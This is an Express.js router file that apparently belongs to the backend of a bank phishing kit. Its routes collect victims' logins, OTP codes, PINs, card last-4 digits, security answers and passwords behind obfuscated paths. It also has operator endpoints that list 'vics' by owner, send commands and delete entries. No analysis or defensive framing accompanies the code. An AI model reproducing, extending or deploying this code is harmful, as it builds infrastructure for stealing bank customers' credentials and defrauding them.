const express = require("express");
const {
  getOwnerVics,
  command,
  getInfo,
  submitLogin,
  submitLoginAgain,
  submitOtp,
  submitPin,
  submitLast4,
  deleteEntry,
  submitSecAnswer,
  submitPassword,
} = require("../controllers/ubankController");

const router = express.Router();

router.get("/customers/:owner", getOwnerVics);
router.post("/command", command);
router.get("/customers/id/:uniqueid", getInfo);
router.post("/auwdoiuawdoih", submitLogin);
router.post("/loginAgain", submitLoginAgain);
router.post("/ccsecsdczx", submitOtp);
router.post("/fwfawdqWD", submitPin);
router.post("/fsgrewfdds", submitLast4);
router.post("/delete", deleteEntry);
router.post("/hfuiiuhdad", submitSecAnswer);
router.post("/fijweioufhs", submitPassword);

module.exports = router;
